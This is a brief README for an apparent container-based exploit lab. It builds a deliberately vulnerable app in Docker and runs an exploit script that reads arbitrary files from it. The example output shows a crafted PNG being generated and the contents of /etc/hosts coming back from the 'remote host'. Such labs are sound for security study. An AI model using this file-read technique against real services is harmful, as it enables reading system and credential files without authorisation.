## Container exploit playground

WIP

Steps to run:
* Build the image: `docker build -t poc .`
* Run the vulnerable app: `docker run --rm -p 3000:3000 poc`
* Trigger the exploit, passing in whatever file you want to cat from the poc: `./exploit.sh /etc/hosts`

Example output:
```shell
$ ./exploit.sh /etc/hosts
  Recompressing IDAT chunks in k8s.png to pngout.png
   Total length of data found in critical chunks            =    286254
   Best pngcrush method        =   7 (ws 15 fm 0 zl 9 zs 0) =    235241
CPU time decode 0.820487, encode 2.650206, other 0.001669, total 3.474239 sec
Found. Redirecting to /

Content of '/etc/hosts' on remote host:
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.3	48a345143cfd
```

